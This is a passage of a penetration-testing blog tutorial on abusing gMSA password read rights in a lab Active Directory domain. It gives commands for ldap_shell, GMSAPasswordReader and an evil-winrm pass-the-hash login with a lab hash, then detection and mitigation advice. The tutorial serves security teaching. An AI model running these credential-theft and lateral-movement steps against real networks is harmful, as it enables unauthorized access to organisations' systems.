<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjextQNYax4qtT7NEpnHJ3Spny8GQgV2PGcB4ltCxdxoJt1Iqj91lVVcG9_EFk9QHRBPq7lefowrLooPEjsdyFuxulvmyFLN17qcH-g5m6GhwoQGdEGWpWqcXTPd9QjF3O734BdGOw_LYKh_0OTXFsQyYRVhKWD-qcQ4PUnWoWhMLVDeiwqhQ2mJwpcE3VH/s16000/27.png"/></span></p>
<h4><span style="color: #800000;">Ldap_shell</span></h4>
<p><span style="color: #000000;">This can also be achieved using <a style="color: #000000;" href="https://github.com/PShlyundin/ldap_shell">ldap_shell</a>:</span></p>
<p><span style="color: #000000;">Clone the repository and install:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/PShlyundin/ldap_shell
cd ldap_shell
python3 -m pipx install .</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiPgWxQ0GJboSrsW0Xq0QcEuKQgBUl642Wa-EtF0HJ3zWPNjfTbdG8TWL3tbxT0I924Z8ARGja6PFzOFXfNDzmeDYdZjzpNAPHbmbdXaZ5YY9KZWCdjhyJkr0FPbbnpBqk9Q5A52nlmOhexuEXiRSZGuAKQUDV769fu9c9wufPT026wrLInVGtf9yeOMy4j/s16000/28.png"/></span></p>
<p><span style="color: #000000;">Use <strong>get_laps_gmsa</strong> option, after getting shell as komal user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ldap_shell ignite.local/komal:Password@1 -dc-ip 192.168.1.48</pre>
<h2><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj1vjlvuWvFHzyCWNuWGhKT2rZogx_lUYUIVyAMrTxAKwWyT7FaFB79qAAxX5n4ba1JdOxstL9zj-fF3j7jRWqY1dS9naE4tMorych4T1-6Ho5OpBTTRC7gmlAfQh2PCK59e55sCybCIq8jt8FpL3EBLQi9z5wxabGlsOg2oaWKNev5OjIJv9V8krBHBZYc/s16000/29.png"/></h2>
<h3><span style="color: #800000;">Windows Exploitation</span></h3>
<h4><span style="color: #800000;">GMSAPasswordReader</span></h4>
<p><span style="color: #000000;">On Windows systems (Komal user’s client machine), the user can run <strong data-start="644" data-end="671">GMSAPasswordReader (C#)</strong> to retrieve gMSA passwords.</span></p>
<p><span style="color: #000000;">Download the exe from <strong>https://github.com/ricardojba/Invoke-GMSAPasswordReader</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-GMSAPasswordReader -Command "--AccountName MyGMSA"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhGpiFE49db8JGdPZUd6s10gvQZQWeUg-BPu9y-0RCnDhL4Uj9fFC4ZZysf9uP_C0XCR25tqJj7_o7Fcx75WPcyM9P8B4-CRzPe_9DgrX7xI99kleFV9gknHOiZaKjSF5f6ROt8p1CYAT8UJytR7zoaUiBABnS3Ak2Z9bZbbQja-23sOPJEA_DL1lxcpky6/s16000/30.png"/></span></p>
<h3><span style="color: #800000;">Post-Exploitation</span></h3>
<p><span style="color: #000000;">Use <strong data-start="802" data-end="816">evil-winrm</strong> to perform lateral movement with the <strong data-start="854" data-end="877">Pass-the-Hash (PtH)</strong> technique.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.48 -u MyGMSA$ -H 942bf4cc93e95fb0b7f98f9c5346ceae</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCRo3cZjZof9KWShXyevuLuRB7nJAxNXZSUb1WlImmyFPZp7bogPTJfpDwHjf3plnqHa42bm3fBQpdL3J0wNv7JoBbHIeaV0ti3bUi9yFoa9hedEy9ohRs4tlQr2dKdzcMsATmwajFT5kyOpFgUP2rGAlznGODT7iS4TBU3BNFcxLzCDFPzKwFRtS0BhCk/s16000/31.png"/></span></p>
<h3><span style="color: #800000;">Detection &amp; Mitigation</span></h3>
<h4><span style="color: #800000;">Detection</span></h4>
<p><span style="color: #000000;">Detecting unauthorized reads of the <strong>msDS-ManagedPassword</strong> attribute can be challenging, especially if performed by a computer account. However, <strong>regular users should never access gMSA passwords</strong>, making it crucial to monitor <strong>Active Directory event logs</strong> for any non-computer account attempting to read them. This is particularly important in identifying signs of an ongoing ReadGMSAPassword attack in its early stages.<br/>
</span></p>
<p><span style="color: #000000;">Additionally, track changes to <strong>msDS-GroupMSAMembership</strong>, which controls which entities can retrieve gMSA passwords.</span></p>
<p><span style="color: #000000;"><strong>Event ID 4662 (Audit Directory Service Access)</strong> logs access attempts to AD objects based on <strong>system access control lists (SACLs)</strong>. To detect gMSA password reads, filter for:</span></p>
<ul>
<li><span style="color: #000000;"><strong>Operation Type:</strong> Object Access</span></li>
<li><span style="color: #000000;"><strong>Accesses:</strong> Read Property</span></li>
<li><span style="color: #000000;"><strong>Properties:</strong> This is the GUID of the msDS-ManagedPassword attribute.</span></li>
</ul>
<h4><span style="color: #800000;">Mitigation</span></h4>
<p><span style="color: #000000;">Mitigating gMSA exploitation requires securing <strong>Active Directory privileges</strong> to prevent unauthorized modification of gMSA permissions or password access. Implement the following best practices:</span></p>
<ul>
<li><span style="color: #000000;"><strong>Enforce Least Privilege:</strong> Regularly audit and restrict permissions to modify gMSA accounts, ensuring only necessary entities have access.</span></li>
<li><span style="color: #000000;"><strong>Monitor gMSA Access:</strong> Continuously review the <strong>msDS-GroupMSAMembership</strong> attribute to ensure only authorized computer accounts can retrieve the password.</span></li>
<li><span style="color: #000000;"><strong>Enable Real-Time Alerts:</strong> Set up monitoring to detect and alert on <strong>any changes</strong> to gMSA permissions, allowing swift response to potential threats.</span></li>
</ul>
<p><span style="color: #000000;"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is a completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact</span> <a href="https://www.linkedin.com/in/komal--rajput/"><strong>Here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
